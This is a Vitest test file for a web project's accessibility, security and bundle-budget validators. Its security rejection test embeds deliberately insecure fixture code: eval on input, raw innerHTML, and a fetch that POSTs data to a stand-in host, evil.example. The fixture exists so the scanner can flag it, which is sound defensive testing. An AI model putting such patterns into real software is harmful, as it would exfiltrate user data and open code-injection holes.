import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import type { ValidationIssue } from '../../src/types/tool';
import {
  inspectHtmlAccessibility,
  inspectToolInteractiveLabels,
  runAccessibilityValidation,
} from '../../scripts/validation/validate-accessibility';
import {
  inspectSourceSecurity,
  runSecurityValidation,
} from '../../scripts/validation/validate-security';
import { inspectDistPerformanceBudgets } from '../../scripts/tasks/performance';

const tempDirs: string[] = [];

function createTempDir(prefix: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}

afterEach(() => {
  for (const dir of tempDirs.splice(0)) {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

describe('Phase 9 accessibility, security, and static bundle checks', () => {
  it('passes static source security and interactive tool label checks before or after build', async () => {
    const labelIssues: ValidationIssue[] = [];
    const scannedTools = inspectToolInteractiveLabels(path.resolve('src/tools'), labelIssues);
    expect(scannedTools).toBeGreaterThanOrEqual(5);
    expect(labelIssues).toEqual([]);

    const secReport = await runSecurityValidation();
    expect(secReport.status).toBe('PASS');
    expect(secReport.issues).toEqual([]);
  });

  it('passes dist accessibility and bundle budget checks when built dist artifacts are present', async () => {
    if (!fs.existsSync(path.resolve('dist/index.html'))) {
      // Fixture-based validation verifies the validators cleanly before `npm run build` runs.
      const fixtureDist = createTempDir('ahadex-perf-fixture-');
      fs.mkdirSync(path.join(fixtureDist, 'assets'), { recursive: true });
      fs.writeFileSync(path.join(fixtureDist, 'index.html'), '<html></html>', 'utf8');
      fs.writeFileSync(path.join(fixtureDist, 'assets', 'app.js'), 'console.log(1);', 'utf8');
      fs.writeFileSync(path.join(fixtureDist, 'assets', 'app.css'), 'body{}', 'utf8');

      const perf = inspectDistPerformanceBudgets(fixtureDist);
      expect(perf.status).toBe('PASS');
      return;
    }

    const a11yReport = await runAccessibilityValidation();
    expect(a11yReport.status).toBe('PASS');
    expect(a11yReport.checkedCount).toBeGreaterThanOrEqual(12);
    expect(a11yReport.issues).toEqual([]);

    const perfReport = inspectDistPerformanceBudgets();
    expect(perfReport.issues.filter((i) => i.severity === 'critical')).toEqual([]);
  });
});

describe('Phase 9 defect rejection tests', () => {
  it('flags missing lang, skipped headings, unlabeled inputs, empty buttons, and missing alt', () => {
    const issues: ValidationIssue[] = [];
    inspectHtmlAccessibility(
      `<html><body>
        <main id="other">
          <h1>Title</h1>
          <h3>Skipped heading</h3>
          <img src="/logo.svg" />
          <button></button>
          <input type="text" />
          <a href="https://example.com" target="_blank">External</a>
        </main>
      </body></html>`,
      'fixture:bad-a11y',
      issues,
    );

    const codes = new Set(issues.map((i) => i.code));
    expect(codes.has('A11Y_MISSING_HTML_LANG')).toBe(true);
    expect(codes.has('A11Y_MISSING_MAIN_LANDMARK')).toBe(true);
    expect(codes.has('A11Y_HEADING_LEVEL_SKIPPED')).toBe(true);
    expect(codes.has('A11Y_IMG_MISSING_ALT')).toBe(true);
    expect(codes.has('A11Y_EMPTY_BUTTON')).toBe(true);
    expect(codes.has('A11Y_UNLABELED_CONTROL')).toBe(true);
    expect(codes.has('A11Y_TARGET_BLANK_NO_REL')).toBe(true);
  });

  it('rejects eval, raw innerHTML, non-JSON-LD dangerouslySetInnerHTML, and outbound fetch in tools', () => {
    const issues: ValidationIssue[] = [];
    inspectSourceSecurity(
      'src/tools/bad-tool/engine.ts',
      `
        export async function bad(data: string) {
          eval(data);
          document.body.innerHTML = data;
          await fetch('https://evil.example/upload', { method: 'POST', body: data });
          return <div dangerouslySetInnerHTML={{ __html: data }} />;
        }
      `,
      true,
      issues,
    );

    const codes = new Set(issues.map((i) => i.code));
    expect(codes.has('SEC_DYNAMIC_CODE_EXECUTION')).toBe(true);
    expect(codes.has('SEC_RAW_DOM_ASSIGNMENT')).toBe(true);
    expect(codes.has('SEC_TOOL_OUTBOUND_NETWORK')).toBe(true);
    expect(codes.has('SEC_DANGEROUS_HTML_INJECTION')).toBe(true);
  });
});
